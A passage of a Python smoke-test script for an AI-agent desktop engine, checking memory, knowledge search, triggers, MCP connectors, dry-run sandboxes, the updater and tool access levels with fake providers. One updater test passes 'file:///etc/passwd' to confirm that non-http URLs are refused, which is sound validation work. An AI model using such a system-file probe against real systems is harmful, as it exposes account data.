"""smoke.py - Headless end-to-end checks for the engine (no GUI, no API key).

Exercises the substrate so regressions surface fast in CI or on a fresh machine:
DB init + seed, project/agent CRUD, retrieval memory, RAG ingest/search, trigger
creation, and a simulated run loop using a fake provider (so it needs no keys).
"""

from __future__ import annotations

import json
import time

from aria2.core import config, db
from aria2.core.ids import now_ms
from aria2.services import (
    agent_service,
    ambient_service,
    automation_service,
    chat_service,
    knowledge_service,
    memory_service,
    project_service,
    run_service,
)


def run_smoke() -> int:
    # Run against a throwaway DB + config so smoke never pollutes the real
    # %APPDATA%/ARIA2 data with test projects/agents/runs.
    import tempfile
    from pathlib import Path
    tmp = Path(tempfile.mkdtemp(prefix="aria2_smoke_"))
    config.DB_FILE = tmp / "aria2.db"
    config.CONFIG_FILE = tmp / "config.json"
    # Also redirect app_dir so file-based stores (evals reports, knowledge,
    # downloads) write into the throwaway dir instead of the real %APPDATA%/ARIA2
    # — otherwise repeated smoke runs accumulate eval reports there and eventually
    # trip load_history()'s cap (and pollute the user's real Evals chart).
    config.app_dir = lambda _d=tmp: (_d.mkdir(parents=True, exist_ok=True) or _d)
    config._cache = None
    db._reset()

    db.init()
    ok = True

    def check(label, cond):
        nonlocal ok
        print(f"  {'[OK]' if cond else '[XX]'} {label}")
        ok = ok and cond

    print("aria-v2 smoke test")

    # Seed entities
    check("default project exists", project_service.get("general") is not None)
    check("built-in agents seeded", len(agent_service.list_agents()) >= 4)

    # Project + agent CRUD
    p = project_service.create("Smoke Project", goals="test goals")
    check("project create", project_service.get(p["id"]) is not None)
    a = agent_service.create("Tester", "You test things.", memory_scope="project")
    check("agent create", agent_service.get(a["id"]) is not None)

    # Memory recall (offline local embeddings)
    memory_service.remember("User likes dark mode and short answers.", scope="user")
    memory_service.remember("Deployment happens on Fridays.", scope="project",
                            scope_id=p["id"])
    hits = memory_service.recall("when do we deploy", scope="project", scope_id=p["id"])
    check("memory recall returns the deploy fact",
          any("Friday" in h["text"] for h in hits))

    # Hybrid recall: a verbatim term match should outrank an unrelated memory even
    # with the weak offline embedding (lexical component of the score).
    memory_service.remember("My wife is named Sara and she loves hiking.",
                            scope="agent", scope_id="memtest")
    memory_service.remember("The build pipeline runs on Jenkins nightly.",
                            scope="agent", scope_id="memtest")
    _mh = memory_service.recall("what is my wife's name", scope="agent", scope_id="memtest")
    check("hybrid recall ranks the lexically-relevant memory first",
          bool(_mh) and "Sara" in _mh[0]["text"])

    # Capture: a "remember this" request is stored as a clean fact, not the raw
    # imperative; ordinary messages are not captured.
    check("extract_memory_request strips the imperative into a bare fact",
          memory_service.extract_memory_request(
              "Remember that my sister's birthday is June 3") == "my sister's birthday is June 3"
          and memory_service.extract_memory_request(
              "note that the wifi password is hunter2") == "the wifi password is hunter2"
          and memory_service.extract_memory_request("what's the weather today") is None)

    # Reflection: parse a JSON array of facts, and extract+store via a stubbed model.
    check("parse_facts reads a JSON array of facts; junk -> []",
          memory_service.parse_facts('sure ```json\n["likes tea","has a dog"]\n``` ok')
          == ["likes tea", "has a dog"]
          and memory_service.parse_facts("no json here") == [])
    from aria2.core import config as _cfg_m
    from aria2.models import registry as _reg0

    class _FactProv:
        name = "fake"

        def capabilities(self, m):
            from aria2.models.base import Capabilities
            return Capabilities(supports_tools=False, supports_caching=False)

        def count_tokens(self, t):
            return 1

        def stream(self, model, system, messages, tools=None, max_tokens=4096,
                   temperature=1.0, cache=True):
            from aria2.models.base import StreamEvent
            yield StreamEvent(type="text",
                              text='["the user is named Alex","prefers concise answers"]')
            yield StreamEvent(type="done", stop_reason="end_turn")
    _save0 = _reg0.for_settings
    _reg0.for_settings = lambda s, o=None: (_FactProv(), "fake")
    try:
        _rn = memory_service.reflect("User: hi I'm Alex\nAssistant: hello there",
                                     scope="agent", scope_id="reflecttest",
                                     settings=_cfg_m.load(), agent=a)
        _facts = [m["text"] for m in memory_service.list_memories("agent", "reflecttest")]
        check("reflect extracts durable facts from a turn and stores them",
              _rn == 2 and any("Alex" in f for f in _facts))
    finally:
        _reg0.for_settings = _save0

    # Consolidation: near-duplicate memories (same terms, different wording) merge;
    # exact dupes are already prevented at write time, so use a near-dup pair.
    memory_service.remember("the deploy key is stored in vault",
                            scope="agent", scope_id="dedup")
    memory_service.remember("the deploy key is stored in the vault",
                            scope="agent", scope_id="dedup")
    _before = len(memory_service.list_memories("agent", "dedup"))
    _merged = memory_service.consolidate("agent", "dedup")
    _after = len(memory_service.list_memories("agent", "dedup"))
    check("consolidate merges near-duplicate memories (keeps one)",
          _before == 2 and _merged == 1 and _after == 1)

    # Transcript persistence keeps only text — a bare tool_use (from a turn stopped
    # mid-tool-use) is dropped so it can't break the next turn's API request.
    from aria2.services.chat_service import _visible_assistant_content as _vac
    check("persisted assistant content strips dangling tool_use blocks",
          _vac([{"type": "text", "text": "partial"},
                {"type": "tool_use", "id": "t", "name": "x", "input": {}}])
          == [{"type": "text", "text": "partial"}]
          and _vac([{"type": "tool_use", "id": "t", "name": "x", "input": {}}]) == []
          and _vac(None) == [])

    # Knowledge ingest + search
    knowledge_service.ingest_text(p["id"], "arch.md",
                                  "The run engine streams tokens over an event bus "
                                  "and persists runs and steps in SQLite.")
    ks = knowledge_service.search("how are runs stored", p["id"])
    check("knowledge search returns a hit", len(ks) > 0)

    # ingest_folder skips vendored dirs (node_modules) instead of flooding the KB.
    import os as _os4
    import tempfile as _tf4
    _kf = _tf4.mkdtemp()
    _os4.makedirs(_os4.path.join(_kf, "node_modules", "pkg"))
    _os4.makedirs(_os4.path.join(_kf, "src"))
    for _rel in ("readme.md", "src/app.py", "node_modules/pkg/index.js"):
        with open(_os4.path.join(_kf, _rel), "w", encoding="utf-8") as _fh:
            _fh.write("some knowledge content to embed\n")
    _kp = project_service.create("KnowFolderTest", folder=_kf)
    _kres = knowledge_service.ingest_folder(_kp["id"], _kf)
    _kdocs = [d["title"] for d in knowledge_service.list_documents(_kp["id"])]
    check("ingest_folder ingests source but skips node_modules",
          "readme.md" in _kdocs and "app.py" in _kdocs
          and "index.js" not in _kdocs and _kres["files"] == 2)
    project_service.delete(_kp["id"])

    # Re-embed migration: re-vectorise stored memory + knowledge with the current
    # provider (so switching embedding providers doesn't orphan old vectors).
    check("reembed_all re-embeds existing memory + knowledge",
          memory_service.reembed_all() > 0 and knowledge_service.reembed_all() > 0
          and len(memory_service.recall("when do we deploy", scope="project",
                                        scope_id=p["id"])) > 0)
    # Ollama embeddings parse the OpenAI-compatible /v1/embeddings response.
    import requests as _rq
    _orig_post = _rq.post

    class _FakeEmbResp:
        def raise_for_status(self):
            pass

        def json(self):
            return {"data": [{"embedding": [0.1, 0.2, 0.3]},
                             {"embedding": [0.4, 0.5, 0.6]}]}
    _rq.post = lambda *a, **k: _FakeEmbResp()
    try:
        from aria2.models.embeddings import _ollama_embed
        check("ollama embeddings parse the OpenAI-compatible response",
              _ollama_embed(["a", "b"], "http://localhost:11434", "nomic-embed-text")
              == [[0.1, 0.2, 0.3], [0.4, 0.5, 0.6]])
    finally:
        _rq.post = _orig_post

    # Chat persistence + fork
    chat = chat_service.create_chat(p["id"], agent_id=a["id"])
    # Persisting a message publishes message.persisted (so the UI can attach the
    # id to the live bubble for copy/fork/delete without a reload).
    from aria2.core.events import bus as _evbus
    _persisted = []
    _u1 = _evbus.subscribe("message.persisted", lambda pl: _persisted.append(pl))
    m_hello = chat_service._persist_message(chat["id"], "user", [{"type": "text", "text": "hello"}])
    chat_service._persist_message(chat["id"], "assistant", [{"type": "text", "text": "hi"}])
    _u1()
    check("message.persisted fires with id + role on each persisted message",
          any(e.get("message_id") == m_hello and e.get("role") == "user"
              for e in _persisted))
    forked = chat_service.fork(chat["id"])
    check("chat fork copies messages",
          len(chat_service.list_messages(forked["id"])) == 2)
    # Fork up to a specific message: the branch stops at (and includes) it.
    chat_service._persist_message(chat["id"], "user", [{"type": "text", "text": "third"}])
    forked2 = chat_service.fork(chat["id"], up_to_message_id=m_hello)
    _fm = chat_service.list_messages(forked2["id"])
    check("fork up_to_message_id branches only up to that message",
          len(_fm) == 1 and _fm[0]["content"][0]["text"] == "hello")

    # Trigger
    t = automation_service.create("Daily digest", "schedule", "Summarise the day.",
                                  project_id=p["id"], agent_id=a["id"],
                                  config_obj={"interval": "daily", "at": "09:00"})
    check("trigger has a next_run", automation_service.get(t["id"])["next_run"] is not None)

    # Simulated run loop with a fake provider (no API key needed)
    rid = _simulated_run(p, a)
    steps = run_service.steps(rid)
    check("simulated run recorded steps", len(steps) >= 2)
    check("simulated run used the tool", any(s["type"] == "tool" for s in steps))

    # ── Moat 1: provenance memory + belief revision ──────────────────────────
    # Unique per run so the persistent DB's dedup doesn't return stale rows.
    nonce = str(now_ms())
    base = memory_service.remember(f"Base fact {nonce}: API at api{nonce}.example.com.",
                                   scope="user")
    derived = memory_service.remember(f"Derived {nonce}: webhooks target example.com.",
                                      scope="user", derived_from=[base["id"]])
    deps = memory_service.dependents(base["id"])
    check("derived memory links to its parent", any(d["id"] == derived["id"] for d in deps))
    ret = memory_service.retract(base["id"])
    check("retract flags dependents for review", ret.get("flagged_for_review", 0) >= 1)
    after = memory_service.recall(f"api{nonce}", scope="user")
    check("recall excludes retracted facts",
          all(f"Base fact {nonce}" not in h["text"] for h in after))

    # ── Moat 2: run replay (snapshot + fork-from-step) ───────────────────────
    snap = run_service.snapshot_at_step(rid, 1)
    check("model step captured a context snapshot", snap is not None and "messages" in snap)
    fork_id = _forked_run(rid)
    check("fork created a new run", run_service.get_run(fork_id) is not None)
    check("fork records lineage",
          run_service.get_run(fork_id)["forked_from_run_id"] == rid)
    diff = run_service.diff_runs(rid, fork_id)
    check("diff_runs returns step comparison", len(diff) >= 1)

    # ── Moat 3: context compiler stays within budget ─────────────────────────
    from aria2.models.base import Capabilities
    from aria2.runtime import context_compiler
    compiled = context_compiler.compile_context(
        caps=Capabilities(context_window=2000),
        system_base="You are a tester.", project_goals="",
        recalled=[{"text": "x" * 50} for _ in range(20)],
        knowledge=[{"title": "d", "text": "y" * 50} for _ in range(20)],
        history=[{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
        budget_tokens=1000,
    )
    check("context compiler respects the token budget", compiled.used_tokens <= 1000)

    # ── Moat 4: ambient capture mines an automation proposal ─────────────────
    for i in range(6):
        ambient_service.record("file_change", f"{p['id']}:.py",
                               {"path": f"f{i}.py", "name": f"f{i}.py"}, project_id=p["id"])
    ambient_service.mine()
    props = ambient_service.list_proposals("pending")
    check("ambient mining produced a proposal", len(props) >= 1)
    if props:
        acc = ambient_service.accept_proposal(props[0]["id"])
        check("accepting a proposal creates a trigger", "trigger_id" in acc)

    # Ambient watcher _scan: prunes ignored dirs (no descending into node_modules),
    # detects real file changes, and bounds its mtime cache to existing files.
    import os as _os3
    import tempfile as _tf3
    _afold = _tf3.mkdtemp()
    _os3.makedirs(_os3.path.join(_afold, "node_modules"))
    _os3.makedirs(_os3.path.join(_afold, "sub"))
    for _rel in ("a.py", "node_modules/junk.py", "sub/b.py"):
        with open(_os3.path.join(_afold, _rel), "w", encoding="utf-8") as _fh:
            _fh.write("x = 1\n")
    _aproj = project_service.create("AmbientScanTest", folder=_afold)
    _w = ambient_service.AmbientWatcher()
    _w._scan()  # first pass seeds mtimes, records nothing
    _keys = set(_w._mtimes)
    check("ambient scan tracks real files but skips ignored dirs (node_modules)",
          any(k.endswith("a.py") for k in _keys)
          and any(k.endswith("b.py") for k in _keys)
          and not any("node_modules" in k for k in _keys))
    import time as _t3
    _apath = _os3.path.join(_afold, "a.py")
    _os3.utime(_apath, (_t3.time() + 5, _t3.time() + 5))  # bump mtime into the future
    _obs_before = len(ambient_service.recent_observations(500))
    _w._scan()
    check("ambient scan records a file_change on modification",
          len(ambient_service.recent_observations(500)) > _obs_before)
    project_service.delete(_aproj["id"])

    # ── Delegation: parallel sub-agents as durable child runs + routing learns ─
    from aria2.services import routing_service
    top_id = _delegation_run(p)
    kids = run_service.children(top_id)
    check("delegation created parallel child runs", len(kids) == 2)
    check("child runs are durable + parented",
          all(k["parent_run_id"] == top_id and k["kind"] == "delegated" for k in kids))
    rep = routing_service.agent_report("researcher")
    check("routing learned from a delegated run", any(r["runs"] > 0 for r in rep))
    rec = routing_service.recommendations("research the competitive landscape")
    check("router ranks agents for a task", len(rec) >= 1 and "score" in rec[0])

    # ── MCP connectors: connect the echo server, discover + call a tool ───────
    import sys

    from aria2.services import connector_service
    con = connector_service.create(
        "Echo Test", sys.executable, args=["-m", "aria2.devtools.echo_mcp_server"])
    test = connector_service.test_connection(con["id"])
    check("MCP connector connects + lists tools",
          test.get("ok") and any(t["name"] == "echo" for t in test.get("tools", [])))
    from aria2.runtime.tools.registry import build_toolset
    ts, _ = build_toolset(base_dir=".", memory_scope="none", memory_scope_id="",
                          project_id=p["id"], include_shell=False,
                          settings={"mcp_enabled": True, "delegation_enabled": False})
    mcp_tool = next((n for n in ts.names() if n.startswith("mcp_")), None)
    check("MCP tool registered in the toolset", mcp_tool is not None)
    if mcp_tool:
        out = ts.get(mcp_tool).fn(text="hello-mcp")
        check("MCP tool call returns the echoed text", "hello-mcp" in str(out.get("content")))
    connector_service.delete(con["id"])

    # ── Self-improvement: failed run → fix proposal → applied guidance ────────
    from aria2.core.ids import new_id as _nid
    from aria2.services import self_improvement_service
    fail_run = _nid("run")
    db.insert("runs", {
        "id": fail_run, "kind": "delegated", "status": "failed",
        "agent_id": a["id"], "project_id": p["id"], "chat_id": None,
        "parent_run_id": None, "trigger_id": None, "title": "Tester",
        "budget_usd": 0, "cost_usd": 0, "token_total": 0,
        "error": "Agent reached max iterations.", "started_at": now_ms(),
    })
    prop_id = self_improvement_service.analyze_failure(
        fail_run, settings={"self_improvement_enabled": True}, use_llm=False)
    check("failure analysis files an agent proposal", prop_id is not None)
    before = agent_service.get(a["id"])["system_prompt"]
    res = ambient_service.accept_proposal(prop_id)
    after_prompt = agent_service.get(a["id"])["system_prompt"]
    check("accepting applies learned guidance to the agent",
          res.get("applied") and len(after_prompt) > len(before)
          and "[Learned guidance]" in after_prompt)

    # ── File + webhook triggers ──────────────────────────────────────────────
    ftrig = automation_service.create("Watch tmp", "file", "Summarise what changed.",
                                      project_id=p["id"], agent_id=a["id"],
                                      config_obj={"path": "."})
    check("file trigger created (event-driven, no next_run)",
          automation_service.get(ftrig["id"])["next_run"] is None)
    wtrig = automation_service.create("Deploy hook", "webhook", "Handle the deploy event.",
                                      project_id=p["id"], agent_id=a["id"])
    url = automation_service.webhook_url(automation_service.get(wtrig["id"]))
    check("webhook trigger gets a tokenised URL", "/hook/" in url and "token=" in url)
    check("webhook server fires the trigger over HTTP", _hit_webhook(url))

    # ── HTTP/SSE MCP transport ────────────────────────────────────────────────
    from aria2.services import connector_service as _cs
    httpd, mcp_url = _start_http_mcp()
    try:
        hcon = _cs.create("HTTP Echo", "", transport="http", url=mcp_url)
        ht = _cs.test_connection(hcon["id"])
        check("HTTP MCP connector connects + lists tools",
              ht.get("ok") and any(t["name"] == "echo" for t in ht.get("tools", [])))
        call = _cs.call(hcon["id"], "echo", {"text": "over-http"})
        check("HTTP MCP tool call returns echoed text", "over-http" in str(call.get("content")))
        _cs.delete(hcon["id"])
    finally:
        httpd.shutdown()

    # ── MCP auth: bearer token + PKCE/refresh ─────────────────────────────────
    authd, aurl = _start_http_mcp(required_token="s3cret")
    try:
        good = _cs.create("Auth MCP", "", transport="http", url=aurl,
                          auth={"type": "bearer", "token": "s3cret"})
        check("bearer-authed HTTP MCP connects with token",
              _cs.test_connection(good["id"]).get("ok"))
        bad = _cs.create("NoAuth MCP", "", transport="http", url=aurl)
        check("HTTP MCP rejects missing bearer token",
              not _cs.test_connection(bad["id"]).get("ok"))
        _cs.delete(good["id"]); _cs.delete(bad["id"])
    finally:
        authd.shutdown()

    # Tokens are encrypted at rest but usable.
    enc = _cs.create("EncTok", "", transport="http", url="http://x",
                     auth={"type": "bearer", "token": "plain-secret-123"})
    raw = db.one("SELECT auth_json FROM connectors WHERE id=?", (enc["id"],))["auth_json"]
    check("auth token is ciphertext at rest", "plain-secret-123" not in raw)
    check("auth header decrypts to the real token",
          _cs.auth_headers(enc["id"]).get("Authorization") == "Bearer plain-secret-123")
    _cs.delete(enc["id"])

    from aria2.runtime import mcp_oauth
    import base64 as _b64, hashlib as _hl
    verifier, challenge = mcp_oauth.make_pkce()
    expected = _b64.urlsafe_b64encode(_hl.sha256(verifier.encode()).digest()).decode().rstrip("=")
    check("PKCE challenge derives from verifier (S256)", challenge == expected)
    check("OAuth refresh exchanges the refresh token", _oauth_refresh_works(mcp_oauth))

    # ── Speculative dry-run sandbox ───────────────────────────────────────────
    import tempfile
    from pathlib import Path
    from aria2.runtime import run_engine as _re
    work = tempfile.mkdtemp(prefix="aria2_dryproj_")
    dproj = project_service.create("DryProj", folder=work)
    rid = _dry_run(dproj)
    target = Path(work) / "out.txt"
    check("dry run did NOT touch the real folder", not target.exists())
    diff = _re.get_dry_run_diff(rid)
    check("dry run produced a predicted diff",
          diff and any(f["path"] == "out.txt" for f in diff.get("files", [])))
    _re.commit_dry_run(rid)
    check("committing the dry run applies the change",
          target.exists() and target.read_text() == "hello dry run")

    # ── Git-aware dry-run commit ──────────────────────────────────────────────
    git_ok = _git_dry_run_commit(project_service, _re)
    check("dry-run commit can create a real git commit", git_ok)

    # ── Counterfactual explorer ───────────────────────────────────────────────
    work2 = tempfile.mkdtemp(prefix="aria2_explore_")
    eproj = project_service.create("ExploreProj", folder=work2)
    variants, committed_path = _explore_variants(eproj)
    check("explorer runs N parallel variant dry runs", len(variants) == 2)
    check("each variant has its own predicted diff",
          all(v["diff"].get("files") for v in variants))
    check("explorer applies only the committed variant",
          committed_path.exists() and committed_path.name == "out.txt")

    # ── Eval harness self-test (keyless) ──────────────────────────────────────
    from aria2.evals.harness import self_test as _eval_self_test
    est = _eval_self_test()
    check("eval harness scores a passing case correctly", est["pass_ok"])
    check("eval harness scores a failing case correctly", est["fail_ok"])

    # ── Eval suites + report store ────────────────────────────────────────────
    from aria2.evals import cases as _cases, store as _store
    check("per-agent eval suites are defined",
          set(_cases.suite_names()) >= {"all", "coder", "assistant"}
          and len(_cases.get_suite("all")) >= len(_cases.get_suite("coder")))
    before = len(_store.load_history())
    _store.save_report({"total": 4, "passed": 3, "pass_rate": 0.75, "cost_usd": 0.01}, "coder")
    hist = _store.load_history()
    check("eval report store roundtrips for the chart",
          len(hist) == before + 1 and hist[-1]["pass_rate"] == 0.75)

    # ── Auto-update channel ───────────────────────────────────────────────────
    from aria2.services import update_service
    check("semver comparison detects a newer version",
          update_service.is_newer("9.9.9", "2.0.0") and not update_service.is_newer("1.0.0", "2.0.0"))
    upd = _check_update_via_server(update_service)
    check("update check reads a manifest and flags a newer version",
          upd and upd.get("version") == "99.0.0")
    check("download_update refuses a non-http(s) URL scheme",
          "error" in update_service.download_update("file:///etc/passwd"))
    check("check_for_update ignores a non-http(s) manifest URL",
          update_service.check_for_update("file:///tmp/manifest.json") is None)
    # check_status distinguishes the three outcomes + always reports the running
    # version (the old code collapsed 'check failed' into a false 'up to date').
    st_up = _status_via_server(update_service, "99.0.0")
    check("check_status flags an available update with the current version",
          st_up["status"] == "update" and st_up["version"] == "99.0.0"
          and st_up["current"] == update_service.__version__)
    check("check_status reports 'current' when the manifest is not newer",
          _status_via_server(update_service, "0.0.1")["status"] == "current")
    st_err = update_service.check_status("http://127.0.0.1:9/nope.json")
    check("check_status reports 'error' on a failed check (not a false up-to-date)",
          st_err["status"] == "error"
          and st_err["current"] == update_service.__version__)
    # The real-world bug: an upgraded config persisted a BLANK manifest URL, so
    # every check failed silently. Resolve to the built-in default when blank.
    config.set_key("update_manifest_url", "")
    check("blank manifest URL falls back to the built-in default; override wins",
          update_service._manifest_url() == config.DEFAULTS.get("update_manifest_url")
          and update_service._manifest_url("http://x/m.json") == "http://x/m.json")
    config.set_key("update_manifest_url",
                   config.DEFAULTS.get("update_manifest_url", ""))
    # In-place self-update: guarded to the packaged build; the updater script
    # waits for the pid, copies the new build over the install dir, relaunches.
    check("download_and_install refuses when running from source (not frozen)",
          not update_service.is_frozen()
          and "error" in update_service.download_and_install("https://x/ARIA2.zip"))
    import tempfile as _tfu
    from pathlib import Path as _PPu
    _ubat = update_service._write_updater_bat(
        _PPu(_tfu.mkdtemp(prefix="aria2_upd_")), 4242,
        _PPu("C:/src/app"), _PPu("C:/dest/app"), _PPu("C:/bak/app"))
    _ubt = _ubat.read_text(encoding="utf-8")
    check("updater waits (image-name + timeout), backs up, installs, rolls back",
          "4242" in _ubt and _ubt.lower().count("robocopy") >= 3
          and "ARIA2.exe" in _ubt and "waitloop" in _ubt and "proceed" in _ubt
          and "tries" in _ubt and "bak" in _ubt and "errorlevel 1" in _ubt)
    # SHA-256: helper matches hashlib; check_status surfaces the manifest hash.
    import hashlib as _hl
    _hf = _PPu(_tfu.mkdtemp(prefix="aria2_sha_")) / "x.bin"
    _hf.write_bytes(b"hello aria")
    check("update _sha256_file matches hashlib",
          update_service._sha256_file(_hf) == _hl.sha256(b"hello aria").hexdigest())
    check("check_status surfaces the manifest sha256 for verification",
          _status_via_server(update_service, "99.0.0", "deadbeef").get("sha256")
          == "deadbeef")

    # ── Computer-use tools + access levels ────────────────────────────────────
    from aria2.runtime.tools.registry import build_toolset
    ts_full, _ = build_toolset(base_dir=".", memory_scope="none", memory_scope_id="",
                               project_id=p["id"], include_shell=False,
                               settings={"delegation_enabled": False, "mcp_enabled": False},
                               include_computer=True)
    check("computer-use tools register when requested",
          "mouse_click" in ts_full.names() and "take_screenshot" in ts_full.names())
    ts_off, _ = build_toolset(base_dir=".", memory_scope="none", memory_scope_id="",
                              project_id=p["id"], include_shell=False,
                              settings={"delegation_enabled": False, "mcp_enabled": False})
    check("computer-use tools absent by default", "mouse_click" not in ts_off.names())

    from aria2.services import messaging_service
    full = messaging_service.access_overrides("full", require_confirmation=False)
    full_confirm = messaging_service.access_overrides("full", require_confirmation=True)
    restr = messaging_service.access_overrides("restricted")
    chat = messaging_service.access_overrides("chat_only")
    check("full (no confirm) auto-allows PC control", full.get("mouse_click") == "allow"
          and full.get("run_shell") == "allow")
    check("full (confirm) routes shell/PC control through host approval",
          full_confirm.get("mouse_click") == "ask" and full_confirm.get("run_shell") == "ask"
          and full_confirm.get("read_file") == "allow")
    check("restricted denies PC control + shell but allows read",
          restr.get("mouse_click") == "deny" and restr.get("run_shell") == "deny"
          and restr.get("read_file") == "allow")
    check("chat_only denies all tools", all(v == "deny" for v in chat.values()))

    # Telegram long-reply splitting: nothing is silently truncated (4096 cap).
    long_reply = "\n".join(f"line {i} " + "x" * 50 for i in range(400))
    parts = messaging_service.TelegramBridge._split(long_reply, 4096)
    check("telegram splits long replies into <=4096-char chunks",
          len(parts) > 1 and all(len(p) <= 4096 for p in parts)
          and "".join(parts) == long_reply)
    check("telegram short reply is a single chunk",
          messaging_service.TelegramBridge._split("hi", 4096) == ["hi"])

    # Ollama tool-mode override: force tools on/off regardless of model detection.
    from aria2.models.ollama_provider import OllamaProvider
    op = OllamaProvider("http://localhost:11434")
    config.set_key("ollama_tool_mode", "always")
    check("ollama_tool_mode=always force-enables tools on an unknown model",
          op.capabilities("some-unknown-model:7b").supports_tools is True)
    config.set_key("ollama_tool_mode", "never")
    check("ollama_tool_mode=never disables tools even on a capable model",
          op.capabilities("llama3.1:8b").supports_tools is False)
    config.set_key("ollama_num_ctx", 32768)
    check("ollama_num_ctx is honoured in capabilities",
          op.capabilities("llama3.1:8b").context_window == 32768)
    config.set_key("ollama_tool_mode", "auto")
    config.set_key("ollama_num_ctx", 8192)

    # Small llama3.2 (1b/3b) models over-trigger tool calling on plain chat
    # (a "hello" returns an empty `{}` function call), so they're chat-only;
    # llama3.1:8b stays tool-capable.
    from aria2.models.model_caps import ollama_tool_support
    check("llama3.2 1b/3b are NOT tool-capable; llama3.1:8b is",
          ollama_tool_support("llama3.2:3b") is False
          and ollama_tool_support("llama3.2:1b") is False
          and ollama_tool_support("llama3.1:8b") is True)
    check("qwen3 4b+ are tool-capable; tiny qwen3 1.7b is not",
          ollama_tool_support("qwen3:4b") is True
          and ollama_tool_support("qwen3:8b") is True
          and ollama_tool_support("qwen3:1.7b") is False)
    from aria2.ui.views.local_ai_wizard import _MODELS as _WIZ_MODELS
    _wiz_ids = {m[0] for m in _WIZ_MODELS}
    check("wizard catalogue includes qwen3 + the recommended default ids",
          {"qwen3:4b", "qwen3:8b", "qwen3:14b", "llama3.2:1b"} <= _wiz_ids)

    # Recover tool calls a local model wrote as TEXT (function-call syntax in
    # code fences) instead of structured calls — the qwen3:4b "it printed the
    # plan but nothing ran" bug. AST-based so nested quotes/multiline parse.
    from aria2.models.ollama_provider import _extract_text_tool_calls
    _llm = (
        "First, create the file:\n```python\n"
        'write_file(path="game.html", content="<button>Click</button>")\n'
        "```\nThen start it:\n```python\n"
        'run_shell(command="python -m http.server 8000")\n'
        "```\nFinally:\n"
        'notify_user(message="Game is up at http://localhost:8000")\n'
    )
    _tset = [
        {"name": "write_file", "input_schema": {"properties": {"path": {}, "content": {}},
                                                "required": ["path", "content"]}},
        {"name": "run_shell", "input_schema": {"properties": {"command": {}},
                                               "required": ["command"]}},
        {"name": "notify_user", "input_schema": {"properties": {"message": {}},
                                                 "required": ["message"]}},
    ]
    _rec = _extract_text_tool_calls(_llm, _tset)
    check("recovers text-written tool calls (in order) from a local model",
          [c["name"] for c in _rec] == ["write_file", "run_shell", "notify_user"]
          and _rec[0]["input"]["path"] == "game.html"
          and _rec[1]["input"]["command"] == "python -m http.server 8000"
          and _rec[2]["input"]["message"].startswith("Game is up"))
    check("a lone positional arg maps to the tool's required field",
          _extract_text_tool_calls('notify_user("hi there")', _tset)
          == [{"name": "notify_user", "input": {"message": "hi there"}}])
    check("a prose mention of a tool name is NOT treated as a call",
          _extract_text_tool_calls("You can use write_file to save things.", _tset) == [])

    # Telegram allowlist gating (no network — uses handle_message directly).
    config.set_key("telegram_allowlist", ["123"])
    config.set_key("messaging_access", "chat_only")
    blocked = messaging_service.handle_message("hi", "999")
    check("messaging blocks non-allowlisted senders", blocked["blocked"])
    allowed = _messaging_allowed_run()
    check("messaging runs an allowlisted sender through the engine", not allowed["blocked"])

    # ── Calendar: one-off scheduling ──────────────────────────────────────────
    from datetime import datetime, timedelta
    future = (datetime.now() + timedelta(days=2)).strftime("%Y-%m-%d")
    once = automation_service.schedule_once("Calendar task", "do it", future, at="08:30",
                                            project_id=p["id"], agent_id=a["id"])
    fresh = automation_service.get(once["id"])
    check("one-off calendar trigger gets a future next_run", fresh["next_run"] is not None)
    yr, mo = int(future[:4]), int(future[5:7])
    day = int(future[8:10])
    buckets = automation_service.scheduled_in_month(yr, mo)
    check("calendar buckets the trigger on its day",
          once["id"] in [t["id"] for t in buckets.get(day, [])])

    # Scheduler claim: a due schedule trigger must have next_run advanced BEFORE
    # firing, so a slow run can't be re-fired on the next 30s tick (the duplicate
    # concurrent-run bug). Recurring → advance; one-off → disable.
    sch = automation_service.create("Claim test", "schedule", "noop",
                                    project_id=p["id"], agent_id=a["id"],
                                    config_obj={"interval": "hourly", "at": "00:30"})
    db.update("triggers", sch["id"], {"next_run": now_ms() - 1000})  # force due
    automation_service.scheduler._check_schedule()
    claimed = automation_service.get(sch["id"])
    check("scheduler advances next_run before firing (no duplicate fires)",
          claimed["next_run"] is not None and claimed["next_run"] > now_ms())

    once_t = automation_service.schedule_once(
        "Once claim test", "noop",
        (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d"),
        project_id=p["id"], agent_id=a["id"])
    db.update("triggers", once_t["id"], {"enabled": 1, "next_run": now_ms() - 1000})
    automation_service.scheduler._check_schedule()
    once_after = automation_service.get(once_t["id"])
    check("scheduler disables a one-off trigger when it claims it",
          once_after["enabled"] == 0 and once_after["next_run"] is None)
    automation_service.delete(sch["id"])
    automation_service.delete(once_t["id"])

    # Loop prompting: /loop parsing, the minutes interval, chat-bound loops.
    from aria2.services import chat_service as _lchs
    _pl = automation_service.parse_loop_command
    _c1 = _pl("/loop 10m check my downloads")
    check("/loop parses minutes + hours + days intervals",
          _c1 == {"action": "create", "every_minutes": 10,
                  "prompt": "check my downloads"}
          and _pl("/loop 2h x")["every_minutes"] == 120
          and _pl("/loop 1d x")["every_minutes"] == 1440)
    check("/loop stop, list, help and non-loop text parse correctly",
          _pl("/loop stop")["action"] == "stop"
          and _pl("/loop list")["action"] == "list"
          and _pl("/loop")["action"] == "help"
          and _pl("/loop weekly x")["action"] == "help"
          and _pl("hello")["action"] == "none")
    _lchat = _lchs.create_chat(p["id"], title="loop chat")
    _lt = automation_service.create_loop("ping me", 10, project_id=p["id"],
                                         agent_id=a["id"], chat_id=_lchat["id"])
    check("create_loop schedules a minutes trigger bound to the chat",
          _lt["enabled"] == 1 and _lt["next_run"] is not None
          and abs(_lt["next_run"] - (now_ms() + 10 * 60 * 1000)) < 90_000
          and json.loads(_lt["config_json"])["chat_id"] == _lchat["id"])
    automation_service._post_loop_result(_lchat["id"], "loop says hi")
    _lmsgs = _lchs.list_messages(_lchat["id"])
    check("loop results are posted into the originating chat",
          _lmsgs and "loop says hi" in json.dumps(_lmsgs[-1]["content"]))
    check("stop_loops disables the chat's loops",
          automation_service.stop_loops(_lchat["id"]) == 1
          and automation_service.loops_for_chat(_lchat["id"]) == [])

    # ── v2.2.0: reliability / observability / concurrency ─────────────────────
    from aria2.core import db as _dbm, logs as _logs
    from aria2.core.ids import new_id as _nid
    from aria2.models import base as _mbase

    class _RL(Exception):
        status_code = 429
    check("is_retryable flags 429/5xx but not generic errors",
          _mbase.is_retryable(_RL()) is True
          and _mbase.is_retryable(ValueError("bad api key")) is False)
    check("retry_sleep grows with attempt and is bounded",
